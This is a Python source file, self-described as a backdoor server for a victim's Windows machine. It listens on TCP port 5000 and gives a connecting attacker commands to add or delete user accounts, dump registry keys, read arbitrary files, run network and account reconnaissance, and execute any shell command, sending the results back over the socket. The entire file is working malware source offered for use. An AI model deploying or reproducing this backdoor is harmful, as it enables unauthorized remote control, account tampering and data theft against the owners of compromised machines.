#!/usr/bin/env python
__author__ = "Suraj S Kattige"
__version__ = "2.0.4"
__email__ = "suraj.kattige056@gmail.com"
__maintainer__ = "Suraj S Kattige"
'''
Description: This is the server program that creates a backdoor in a victims machine and gives an attacker to execute the following commands:
1) Create User
2) Delete User
3) Download Registry Key
4) Download File
5) Gather Information
6) Execute a custom command
'''

error_log = open('err.log', 'a')

import subprocess, re, socket, time, struct
from turtledemo.chaos import f
from winreg import *

def recv_data(sock):
    data_len, = struct.unpack('!I',sock.recv(4))
    return sock.recv(data_len).decode()

def send_data(sock, data):
    data_len = len(data)
    sock.send(struct.pack('!I', data_len))
    sock.send(data.encode())
    return

def get_data(sock, str_to_send):
    send_data(sock,str_to_send)
    return recv_data(sock)

def create_user(name, pwd, log_file):
    #net user /add name pwd
    cmd_list = ["net", "user", "/add", name, pwd]
    subprocess.Popen(cmd_list, 0, None, None, log_file, error_log)

def delete_user(name, log_file):
    #net user /del name
    cmd_list = ["net", "user", "/del", name]
    subprocess.Popen(cmd_list, 0, None, None, log_file, error_log)


def download_registry_key(root, path, sock):
    root_dict = {"HKEY_CLASSES_ROOT": HKEY_CLASSES_ROOT,
                 "HKEY_CURRENT_USER": HKEY_CURRENT_USER,
                 "HKEY_LOCAL_MACHINE": HKEY_LOCAL_MACHINE,
                 "HKEY_USERS": HKEY_USERS,
                 "HKEY_CURRENT_CONFIG": HKEY_CURRENT_CONFIG}
    root = root_dict[root]
    key_hdl = CreateKey(root, path) # This is the key handle to the user key and path of existing keys
    num_subkeys, num_values, l_modified = QueryInfoKey(key_hdl)  # This gives the info about the registry keys
#    print("SUBKEYS: %d\nVALUES: %d\n" % (num_subkeys, num_values))
    send_data(sock, "SUBKEYS: %d\nVALUES: %d\n" % (num_subkeys, num_values))

#    print("------------------------------SUBKEYS------------------------------")
    send_data(sock, "------------------------------SUBKEYS------------------------------")
    for i in range(num_subkeys):
#        print(EnumKey(key_hdl, i))
        send_data(sock, EnumKey(key_hdl, i))
#    print("------------------------------VALUES------------------------------")
    send_data(sock, "------------------------------VALUES------------------------------")
    for i in range(num_values):
        v_name, v_data, d_type = EnumValue(key_hdl, i)
#        print("%s : %s" %(v_name, v_data))
        send_data(sock, "%s : %s" %(v_name, v_data))


def download_file(filename, sock):
    f = open(filename, 'r')
    send_data(sock, f.read())
    f.close()

def gather_information(log_name, sock):
    cmd_list = [["ipconfig", "/all"],
                ["netstat"],
                ["net", "accounts"],
                ["net", "file"],
                ["net", "localgroup"],
                ["net","session"],
                ["net", "share"],
                ["net", "user"],
                ["net", "view"]]
    log = open(log_name, 'w')
    for i in cmd_list:
        subprocess.Popen(i, 0, None, None, log, error_log)
    log.close()
    log = open(log_name, 'r')
    send_data(sock, log.read())
    log.close()
    return None

def execute_command(cmd, log_name, sock):
    cmd = cmd.split()
    f = open(log_name, 'w')
    subprocess.Popen(cmd, 0, None, None, f, error_log)
    download_file(log_name, sock)

def main():
    log_file = open("log.txt", 'a')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", 5000))
    sock.listen(1)
    while True:
        conn_sock, conn_info = sock.accept()
        while True:
            option = get_data(conn_sock, "Command: ")
            if option.upper() == "CU":
                username = get_data(conn_sock, "Enter the username: ")
                password = get_data(conn_sock, "Enter the password: ")
                create_user(username, password, log_file)
            elif option.upper() == "DU":
                username = get_data(conn_sock, "Enter the username: ")
                delete_user(username, log_file)
            elif option.upper() == "DRK":
                key = get_data(conn_sock, "KEY: ")
                path = get_data(conn_sock, "PATH: ")
                download_registry_key(key, path, conn_sock)
            elif option.upper() == "DF":
                filename = get_data(conn_sock, "Which file do you want? ")
                download_file(filename, conn_sock)
            elif option.upper() == "GI":
                gather_information('info.txt', conn_sock)
            elif option.upper() == "EC":
                cmd = get_data(conn_sock, "Which command do you want to execute? ")
                execute_command(cmd, 'execute_command.txt', conn_sock)
            elif option.upper() == "E":
                conn_sock.close()
                break
            send_data(conn_sock, "command executed successfully!")


main()

